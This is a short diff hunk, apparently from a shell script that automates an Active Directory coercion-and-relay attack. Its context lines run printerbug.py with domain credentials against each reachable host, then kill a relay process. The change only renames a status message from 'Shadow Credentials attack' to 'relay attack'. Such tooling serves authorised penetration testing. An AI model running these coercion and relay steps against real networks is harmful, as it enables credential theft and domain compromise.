@@ -77,7 +77,7 @@ python3 printerbug.py $DOMAIN/$USERNAME:$PASSWORD@$SHADOW_TARGET "$LISTEN_NETBIO
 sleep 10
 
 kill $RELAY_PID
-echo "[+] Completed Shadow Credentials attack for target: $target"
+echo "[+] Completed relay attack for target: $target"
 
 done < "$REACHABLE_HOSTS"
 
